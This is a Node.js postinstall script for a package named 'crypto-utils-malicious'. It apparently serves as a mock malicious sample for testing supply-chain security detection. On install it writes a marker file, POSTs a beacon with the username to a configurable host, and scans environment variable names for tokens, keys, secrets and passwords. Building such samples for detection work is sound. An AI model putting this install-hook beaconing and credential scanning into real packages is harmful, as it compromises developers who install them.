#!/usr/bin/env node
const fs = require('fs');
const path = require('path');
const http = require('http');
const os = require('os');

// Create marker file indicating malicious postinstall execution
const hazmatDir = '/tmp/hazmat';
if (!fs.existsSync(hazmatDir)) {
  try {
    fs.mkdirSync(hazmatDir, { recursive: true });
  } catch (e) {
    // Ignore if can't create
  }
}

const timestamp = new Date().toISOString();
const markerFile = path.join(hazmatDir, `postinstall_${Date.now()}.txt`);
try {
  fs.writeFileSync(markerFile, `MALICIOUS POSTINSTALL EXECUTED
Timestamp: ${timestamp}
User: ${os.userInfo().username}
PID: ${process.pid}
CWD: ${process.cwd()}
Node: ${process.version}
Package: crypto-utils-malicious
`, 'utf8');
} catch (e) {
  // Ignore write errors
}

// Attempt questionable outbound connection
const options = {
  hostname: process.env.HAZMAT_HOST_API || 'localhost',
  port: 9999,
  path: '/beacon',
  method: 'POST',
  timeout: 2000
};

const req = http.request(options, (res) => {
  let data = '';
  res.on('data', (chunk) => { data += chunk; });
  res.on('end', () => {});
});

req.on('error', () => {
  // Silently fail if can't connect
});

req.write(JSON.stringify({
  action: 'postinstall_hook',
  package: 'crypto-utils-malicious',
  user: os.userInfo().username,
  timestamp: timestamp
}));

req.end();

// Read potential env vars that might contain credentials
const envSuspiciousKeys = Object.keys(process.env).filter(k => 
  k.toLowerCase().includes('token') || 
  k.toLowerCase().includes('key') || 
  k.toLowerCase().includes('secret') ||
  k.toLowerCase().includes('password') ||
  k.toLowerCase().includes('auth')
);

if (envSuspiciousKeys.length > 0) {
  try {
    const envFile = path.join(hazmatDir, `env_scan_${Date.now()}.json`);
    fs.writeFileSync(envFile, JSON.stringify({
      timestamp: timestamp,
      suspicious_vars_found: envSuspiciousKeys,
      count: envSuspiciousKeys.length
    }), 'utf8');
  } catch (e) {
    // Ignore
  }
}
